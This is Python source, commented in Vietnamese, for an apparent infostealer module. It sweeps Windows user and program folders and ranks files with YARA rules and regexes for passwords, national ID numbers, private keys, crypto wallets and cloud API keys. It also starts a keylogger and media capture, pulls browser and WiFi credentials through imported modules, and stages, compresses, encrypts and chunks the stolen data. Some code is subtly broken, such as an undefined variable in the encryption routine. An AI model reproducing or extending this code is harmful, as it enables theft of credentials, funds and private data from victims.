import os
import json
import sqlite3
import threading
import re
import shutil
import pymongo
import mysql.connector
import logging
from typing import Dict, List, Set, Optional, Tuple
from datetime import datetime
import magic  # File type detection
import yara  # Pattern matching
import zlib  # Data compression
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from dataclasses import dataclass, field

from .browser_harvester import BrowserHarvester
from .wifi_harvester import WiFiHarvester
from .advanced_keylogger import AdvancedKeylogger
from .media_capture import MediaCapture

@dataclass
class FileInfo:
    """Thông tin về file thu thập được"""
    path: str
    size: int
    modified: float
    type: str
    mime: str
    sensitivity: int = 0
    copied_to: Optional[str] = None
    metadata: Dict = field(default_factory=dict)

class DataHarvester:
    def __init__(self):
        self.logger = logging.getLogger('harvester')
        self.collected_data: Dict = {}
        self.total_size: int = 0
        self.scan_threads: List[threading.Thread] = []
        
        # Khởi tạo YARA rules
        self._init_yara_rules()
        
        # File patterns
        self.file_patterns = {
            'documents': ['.doc', '.docx', '.pdf', '.txt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx',
                        '.odt', '.ods', '.odp', '.csv', '.md', '.log', '.tex'],
            'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.raw', '.psd', '.svg', '.webp', '.ico'],
            'source_code': [
                '.py', '.js', '.java', '.cpp', '.c', '.h', '.cs', '.php', '.rb', '.go', '.rs',
                '.swift', '.kt', '.ts', '.html', '.css', '.sql', '.sh', '.bash', '.ps1', '.bat',
                '.vb', '.scala', '.r', '.m', '.f90', '.pl', '.ml'
            ],
            'databases': ['.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.frm', '.bak', '.sql'],
            'certificates': [
                '.pem', '.crt', '.key', '.pfx', '.p12', '.cer', '.pub', '.gpg',
                '.asc', '.ovpn', '.ppk', '.jks', '.keystore'
            ],
            'archives': ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.iso', '.img'],
            'config': [
                '.conf', '.cfg', '.ini', '.xml', '.yaml', '.yml', '.json', '.env',
                '.properties', '.toml', '.reg', '.inf', '.cnf', '.config'
            ]
        }
        
        # Crypto wallet patterns  
        self.crypto_wallets = {
            'bitcoin': ['wallet.dat', 'bitcoin'],
            'ethereum': ['keystore', 'geth', 'ethereum'],
            'monero': ['monero', 'bitmonero'],
            'litecoin': ['litecoin'],
            'ripple': ['ripple'],
            'dogecoin': ['dogecoin']
        }
        
        # API key patterns
        self.api_patterns = {
            'aws': [
                r'AKIA[0-9A-Z]{16}',
                r'aws_access_key_id',
                r'aws_secret_access_key'
            ],
            'google': [
                r'AIza[0-9A-Za-z\\-_]{35}',
                r'google_api_key',
                r'google_cloud_key' 
            ],
            'github': [
                r'github_pat_[0-9a-zA-Z]{82}',
                r'gh[pousr]_[0-9a-zA-Z]{36}'
            ],
            'stripe': [
                r'sk_live_[0-9a-zA-Z]{24}',
                r'rk_live_[0-9a-zA-Z]{24}'
            ]
        }
        
    def _init_yara_rules(self):
        """Khởi tạo YARA rules cho phân loại dữ liệu nhạy cảm"""
        self.yara_rules = yara.compile(source="""
            rule ContainsPassword {
                strings:
                    $pass = /password|passwd|pwd/i
                    $hash = /[0-9a-f]{32}|[0-9a-f]{40}|[0-9a-f]{64}/
                    $bcrypt = /\$2[ayb]\$.{56}/
                    $argon = /\$argon2[id]\$.+/
                condition:
                    any of them
            }
            
            rule ContainsSSN {
                strings:
                    $ssn = /\d{3}-\d{2}-\d{4}/
                    $sin = /\d{3}-\d{3}-\d{3}/  // Canadian SIN
                    $nino = /[A-Z]{2}\d{6}[A-Z]/  // UK National Insurance
                    $tfn = /\d{3}[ -]?\d{3}[ -]?\d{3}/  // Australian TFN
                condition:
                    any of them
            }
            
            rule ContainsKeywords {
                strings:
                    $secret = /secret|private|confidential|restricted/i
                    $internal = /internal|classified|proprietary/i
                    $financial = /banking|finance|credit[- ]?card|payment|invoice/i
                    $medical = /medical|health|patient|diagnosis|prescription/i
                    $legal = /legal|lawsuit|attorney|court|agreement|contract/i
                condition:
                    any of them
            }

            rule ContainsSourceCode {
                strings:
                    $api_key = /"api[_-]?key":\s*"[^"]{8,}"/
                    $password = /"password":\s*"[^"]{8,}"/
                    $token = /"(access|auth|bearer|session)[_-]?token":\s*"[^"]{8,}"/
                    $secret = /"(client|app|oauth|jwt)[_-]?secret":\s*"[^"]{8,}"/
                    $private_key = /-----BEGIN( RSA)? PRIVATE KEY-----/
                    $ssh_key = /ssh-rsa\s+[A-Za-z0-9+\/]+/
                condition:
                    any of them
            }

            rule ContainsPersonalInfo {
                strings:
                    $email = /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/
                    $phone = /(\+\d{1,3}[-\s]?)?\d{3}[-\s]?\d{3}[-\s]?\d{4}/
                    $cc = /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/
                    $dob = /(19|20)\d\d[-/.](0[1-9]|1[012])[-/.](0[1-9]|[12][0-9]|3[01])/
                    $passport = /[A-Z]{2}[0-9]{7}/  // Basic passport format
                condition:
                    any of them
            }

            rule ContainsCrypto {
                strings:
                    $btc = /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/  // Bitcoin address
                    $eth = /0x[a-fA-F0-9]{40}/  // Ethereum address
                    $xmr = /4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}/  // Monero address
                    $seed = /(seed|mnemonic|recovery).{0,30}(\b\w+\b.?){12,24}/i  // Seed phrases
                condition:
                    any of them
            }
        """)
        
    def scan_system(self, paths: Optional[List[str]] = None,
                   max_size: int = 100*1024*1024,  # 100MB
                   max_threads: int = 10,
                   capture_media: bool = True,
                   monitor_input: bool = True) -> Dict:
        """Quét hệ thống tìm dữ liệu

        Args:
            paths: Danh sách đường dẫn cần quét
            max_size: Kích thước file tối đa
            max_threads: Số lượng threads tối đa
        """
        try:
            if not paths:
                paths = [
                    os.environ['USERPROFILE'],
                    os.environ['APPDATA'],
                    os.environ['LOCALAPPDATA'],
                    os.environ['PROGRAMFILES'],
                    os.environ['PROGRAMFILES(X86)']
                ]

            # Khởi tạo các harvester
            browser_harvester = BrowserHarvester()
            wifi_harvester = WiFiHarvester()
            keylogger = AdvancedKeylogger()
            media_capture = MediaCapture() if capture_media else None

            # Thu thập browser data
            browser_data = browser_harvester.get_all_browsers_data()
            self.collected_data['browsers'] = browser_data

            # Thu thập WiFi data
            wifi_data = wifi_harvester.get_all_wifi_data()
            self.collected_data['wifi'] = wifi_data

            # Start monitoring nếu được yêu cầu
            if monitor_input:
                keylogger.start()

            # Start media capture nếu được yêu cầu
            if capture_media:
                media_capture.start_monitoring()
                
            # Chia paths cho các threads
            chunk_size = len(paths) // max_threads + 1
            path_chunks = [paths[i:i+chunk_size] for i in range(0, len(paths), chunk_size)]
            
            # Start scan threads
            for chunk in path_chunks:
                t = threading.Thread(
                    target=self._scan_paths,
                    args=(chunk, max_size)
                )
                self.scan_threads.append(t)
                t.start()
                
            # Wait for completion
            for t in self.scan_threads:
                t.join()
                
            # Analyze và phân loại
            self._analyze_collected_data()
            
            return self.collected_data
            
        except Exception as e:
            self.logger.error(f"Scan error: {str(e)}")
            return {}
            
    def _scan_paths(self, paths: List[str], max_size: int) -> None:
        """Quét một list paths"""
        for path in paths:
            try:
                for root, _, files in os.walk(path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            
                            # Check file size
                            size = os.path.getsize(file_path)
                            if size > max_size:
                                continue
                                
                            # Get file info
                            file_info = self._get_file_info(file_path)
                            if not file_info:
                                continue
                                
                            # Categorize file
                            self._categorize_file(file_info)
                            
                            # Update total size
                            self.total_size += size
                            
                        except Exception as e:
                            self.logger.debug(f"Error processing {file}: {str(e)}")
                            
            except Exception as e:
                self.logger.error(f"Error scanning {path}: {str(e)}")
                
    def _get_file_info(self, file_path: str) -> Optional[FileInfo]:
        """Get thông tin về file"""
        try:
            # Basic info
            stat = os.stat(file_path)
            
            # Detect file type
            mime = magic.Magic(mime=True).from_file(file_path)
            file_type = magic.Magic().from_file(file_path)
            
            # Create FileInfo
            info = FileInfo(
                path=file_path,
                size=stat.st_size,
                modified=stat.st_mtime,
                type=file_type,
                mime=mime
            )
            
            # Get metadata
            if mime.startswith('text'):
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                info.metadata['encoding'] = 'text'
                info.metadata['content_hash'] = self._hash_content(content)
                
            return info
            
        except Exception:
            return None
            
    def _categorize_file(self, file_info: FileInfo) -> None:
        """Phân loại file, tính độ nhạy cảm và gắn tags"""
        try:
            # Get extension
            ext = os.path.splitext(file_info.path)[1].lower()
            
            # Match với patterns
            for category, extensions in self.file_patterns.items():
                if ext in extensions:
                    if category not in self.collected_data:
                        self.collected_data[category] = []
                        
                    # Tính sensitivity score
                    sensitivity = 0
                    
                    # Check content và gắn tags
                    tags = set()
                    content = None

                    if file_info.mime.startswith('text'):
                        with open(file_info.path, 'rb') as f:
                            content = f.read()
                            matches = self.yara_rules.match(data=content)
                            
                            # Tính sensitivity và thêm tags
                            for match in matches:
                                if match.rule == 'ContainsPassword':
                                    sensitivity += 25
                                    tags.add('credentials')
                                elif match.rule == 'ContainsSSN':
                                    sensitivity += 30
                                    tags.add('personal_info')
                                elif match.rule == 'ContainsKeywords':
                                    sensitivity += 15
                                    for s in match.strings:
                                        if b'financial' in s[2].lower():
                                            tags.add('financial')
                                        elif b'medical' in s[2].lower():
                                            tags.add('medical')
                                        elif b'legal' in s[2].lower():
                                            tags.add('legal')
                                elif match.rule == 'ContainsSourceCode':
                                    sensitivity += 20
                                    tags.add('source_code')
                                    if b'PRIVATE KEY' in content or b'ssh-rsa' in content:
                                        tags.add('crypto_keys')
                                        sensitivity += 30
                                elif match.rule == 'ContainsPersonalInfo':
                                    sensitivity += 25
                                    tags.add('personal_info')
                                elif match.rule == 'ContainsCrypto':
                                    sensitivity += 35
                                    tags.add('cryptocurrency')
                                
                    # Adjust sensitivity based on file type
                    if category == 'certificates':
                        sensitivity += 50
                        tags.add('crypto_keys')
                    elif category == 'databases':
                        sensitivity += 40
                        tags.add('database')
                    elif category == 'documents':
                        sensitivity += 20
                        if any(kw in file_info.path.lower() for kw in ['report', 'contract', 'agreement']):
                            tags.add('business')
                    elif category == 'source_code':
                        sensitivity += 25
                        tags.add('source_code')
                        
                        # Check for specific code types
                        if content and content.startswith(b'<?php'):
                            tags.add('php')
                        elif b'django' in content or b'flask' in content:
                            tags.add('python')
                        elif b'react' in content or b'vue' in content or b'angular' in content:
                            tags.add('javascript')
                        
                    # Check crypto wallets
                    for wallet_type, patterns in self.crypto_wallets.items():
                        if any(p in file_info.path.lower() for p in patterns):
                            sensitivity += 100
                            file_info.metadata['wallet_type'] = wallet_type
                            
                    # Check API keys
                    if file_info.mime.startswith('text'):
                        with open(file_info.path, 'r', errors='ignore') as f:
                            content = f.read()
                            for api_type, patterns in self.api_patterns.items():
                                for pattern in patterns:
                                    if re.search(pattern, content):
                                        sensitivity += 80
                                        if 'api_keys' not in file_info.metadata:
                                            file_info.metadata['api_keys'] = set()
                                        file_info.metadata['api_keys'].add(api_type)
                                        
                    file_info.sensitivity = min(sensitivity, 100)
                    
                    # Copy sensitive files
                    if file_info.sensitivity >= 50:
                        target = os.path.join(
                            os.environ['TEMP'],
                            f"{category}_{os.path.basename(file_info.path)}"
                        )
                        shutil.copy2(file_info.path, target)
                        file_info.copied_to = target
                        
                    self.collected_data[category].append(file_info)
                    break
                    
        except Exception as e:
            self.logger.debug(f"Categorization error: {str(e)}")
            
    def _analyze_collected_data(self) -> None:
        """Phân tích và phân loại dữ liệu đã thu thập"""
        try:
            # Thống kê cơ bản
            stats = {
                'total_files': sum(len(files) for files in self.collected_data.values() if isinstance(files, list)),
                'total_size': self.total_size,
                'categories': {},
                'sensitivity_levels': {
                    'critical': 0,
                    'high': 0,
                    'medium': 0,
                    'low': 0
                }
            }

            # Phân tích theo loại dữ liệu
            for category, data in self.collected_data.items():
                if category == 'browsers':
                    self._analyze_browser_data(data, stats)
                elif category == 'wifi':
                    self._analyze_wifi_data(data, stats)
                else:
                    if isinstance(data, list):
                        stats['categories'][category] = len(data)
            
            # Phân loại theo sensitivity
            for category, files in self.collected_data.items():
                for file_info in files:
                    if file_info.sensitivity >= 80:
                        stats['sensitivity_levels']['critical'] += 1
                    elif file_info.sensitivity >= 60:
                        stats['sensitivity_levels']['high'] += 1
                    elif file_info.sensitivity >= 40:
                        stats['sensitivity_levels']['medium'] += 1
                    else:
                        stats['sensitivity_levels']['low'] += 1
                        
            self.collected_data['statistics'] = stats
            
        except Exception as e:
            self.logger.error(f"Analysis error: {str(e)}")
            
    def _hash_content(self, content: str) -> str:
        """Tạo hash cho content"""
        import hashlib
        return hashlib.sha256(content.encode()).hexdigest()
        
    def _analyze_browser_data(self, data: Dict, stats: Dict) -> None:
        """Phân tích dữ liệu browser"""
        total_credentials = 0
        total_cookies = 0
        sensitive_sites = 0

        for browser, browser_data in data.items():
            # Count credentials
            credentials = browser_data.get('credentials', [])
            total_credentials += len(credentials)

            # Analyze cookies
            cookies = browser_data.get('cookies', [])
            total_cookies += len(cookies)

            # Check sensitive sites
            history = browser_data.get('history', [])
            sensitive_patterns = [
                r'bank', r'payment', r'wallet', r'invest',
                r'account', r'login', r'secure', r'mail'
            ]
            for entry in history:
                if any(re.search(p, entry['url'].lower()) for p in sensitive_patterns):
                    sensitive_sites += 1

        stats['browser_data'] = {
            'total_credentials': total_credentials,
            'total_cookies': total_cookies,
            'sensitive_sites': sensitive_sites
        }

    def _analyze_wifi_data(self, data: Dict, stats: Dict) -> None:
        """Phân tích dữ liệu WiFi"""
        total_profiles = len(data.get('profiles', []))
        secured_networks = sum(1 for p in data.get('profiles', [])
                             if p.get('authentication') != 'Open')
        saved_passwords = sum(1 for p in data.get('profiles', [])
                            if p.get('password'))

        stats['wifi_data'] = {
            'total_profiles': total_profiles,
            'secured_networks': secured_networks,
            'saved_passwords': saved_passwords
        }

    def encrypt_data(self, key: Optional[bytes] = None, compress: bool = True, chunk_size: int = 1024*1024) -> Optional[Dict]:
        """Mã hóa và nén dữ liệu đã thu thập
        
        Args:
            key: Encryption key
            compress: Whether to compress data
            chunk_size: Size of chunks for chunked transfer
        """
        try:
            if not key:
                # Generate strong key using PBKDF2
                salt = os.urandom(16)
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000
                )
                key = kdf.derive(os.urandom(32))

            # Deduplicate files based on content hash
            dedup_data = {}
            for category, files in self.collected_data.items():
                if isinstance(files, list):
                    seen_hashes = set()
                    unique_files = []
                    for file_info in files:
                        if 'content_hash' in file_info.metadata:
                            if file_info.metadata['content_hash'] not in seen_hashes:
                                seen_hashes.add(file_info.metadata['content_hash'])
                                unique_files.append(file_info)
                            else:
                                self.logger.info(f"Skipping duplicate file: {file_info.path}")
                        else:
                            unique_files.append(file_info)
                    dedup_data[category] = unique_files
                else:
                    dedup_data[category] = files

            # Convert data to bytes
            data = json.dumps(dedup_data, default=str).encode()
            
            # Compress if requested
            if compress:
                data = zlib.compress(data, level=9)  # Maximum compression

            # Split into chunks
            chunks = []
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i + chunk_size]
                # Encrypt chunk
                f = Fernet(key)
                encrypted_chunk = f.encrypt(chunk)
                chunks.append(encrypted_chunk)
            
            # Calculate sensitivity score
            total_score = 0
            total_files = 0
            for category, files in self.collected_data.items():
                if isinstance(files, list):
                    for file_info in files:
                        total_score += file_info.sensitivity
                        total_files += 1
            
            avg_sensitivity = total_score / total_files if total_files > 0 else 0
            
            return {
                'key': key,
                'salt': salt,
                'chunks': chunks,
                'chunk_size': chunk_size,
                'timestamp': datetime.now().isoformat(),
                'metadata': {
                    'compressed': compress,
                    'original_size': len(data),
                    'encrypted_size': len(encrypted_data),
                    'file_count': total_files,
                    'avg_sensitivity': avg_sensitivity,
                    'categories': list(self.collected_data.keys())
                }
            }
            
        except Exception as e:
            self.logger.error(f"Encryption error: {str(e)}")
            return None
            
    def save_data(self, output_file: str, encrypt: bool = True, chunk_size: int = 1024*1024) -> Optional[Dict]:
        """Lưu dữ liệu đã thu thập với hỗ trợ chunked transfer
        
        Args:
            output_file: Path lưu file
            encrypt: Có mã hóa hay không
            chunk_size: Kích thước chunk
            
        Returns:
            Dict chứa key và metadata nếu mã hóa
        """
        try:
            if encrypt:
                data = self.encrypt_data(chunk_size=chunk_size)
                if data:
                    # Ghi metadata
                    metadata = {
                        'key': data['key'],
                        'salt': data['salt'],
                        'chunk_size': data['chunk_size'],
                        'chunk_count': len(data['chunks']),
                        'timestamp': datetime.now().isoformat(),
                        'categories': {},
                    }
                    
                    # Thu thập metadata cho từng category
                    for category, files in self.collected_data.items():
                        if isinstance(files, list):
                            category_tags = set()
                            sensitivity_levels = {
                                'critical': 0,
                                'high': 0,
                                'medium': 0,
                                'low': 0
                            }
                            
                            for file_info in files:
                                # Collect tags
                                if hasattr(file_info, 'metadata') and 'tags' in file_info.metadata:
                                    category_tags.update(file_info.metadata['tags'])
                                    
                                # Classify sensitivity
                                if file_info.sensitivity >= 80:
                                    sensitivity_levels['critical'] += 1
                                elif file_info.sensitivity >= 60:
                                    sensitivity_levels['high'] += 1
                                elif file_info.sensitivity >= 40:
                                    sensitivity_levels['medium'] += 1
                                else:
                                    sensitivity_levels['low'] += 1
                                    
                            metadata['categories'][category] = {
                                'file_count': len(files),
                                'tags': list(category_tags),
                                'sensitivity_levels': sensitivity_levels
                            }
                    
                    # Ghi metadata
                    meta_file = f"{output_file}.meta"
                    with open(meta_file, 'w') as f:
                        json.dump(metadata, f, indent=2, default=str)
                        
                    # Ghi từng chunk
                    for i, chunk in enumerate(data['chunks']):
                        chunk_file = f"{output_file}.{i:04d}"
                        with open(chunk_file, 'wb') as f:
                            f.write(chunk)
                            
                    return metadata
                    
            else:
                with open(output_file, 'w') as f:
                    json.dump(self.collected_data, f, indent=2, default=str)
                return None
                
        except Exception as e:
            self.logger.error(f"Save error: {str(e)}")
            return None
            
    def load_chunks(self, file_pattern: str, key: bytes) -> Optional[Dict]:
        """Load và decrypt dữ liệu từ chunks
        
        Args:
            file_pattern: Pattern của files (e.g. "data.bin")
            key: Encryption key
            
        Returns:
            Dict chứa dữ liệu đã decrypt
        """
        try:
            # Load metadata
            with open(f"{file_pattern}.meta", 'r') as f:
                metadata = json.load(f)
                
            # Load và decrypt từng chunk
            data = bytearray()
            f = Fernet(key)
            
            for i in range(metadata['chunk_count']):
                chunk_file = f"{file_pattern}.{i:04d}"
                with open(chunk_file, 'rb') as f_chunk:
                    encrypted_chunk = f_chunk.read()
                    decrypted_chunk = f.decrypt(encrypted_chunk)
                    data.extend(decrypted_chunk)
                    
            # Decompress nếu cần
            if metadata.get('compressed', True):
                data = zlib.decompress(data)
                
            # Parse JSON
            return json.loads(data.decode())
            
        except Exception as e:
            self.logger.error(f"Load chunks error: {str(e)}")
            return None
            
    def cleanup(self) -> None:
        """Dọn dẹp temporary files"""
        try:
            # Remove copied files
            for category, files in self.collected_data.items():
                if isinstance(files, list):
                    for file_info in files:
                        if file_info.copied_to and os.path.exists(file_info.copied_to):
                            os.remove(file_info.copied_to)
                            
            # Clear data
            self.collected_data.clear()
            self.total_size = 0
            
        except Exception as e:
            self.logger.error(f"Cleanup error: {str(e)}")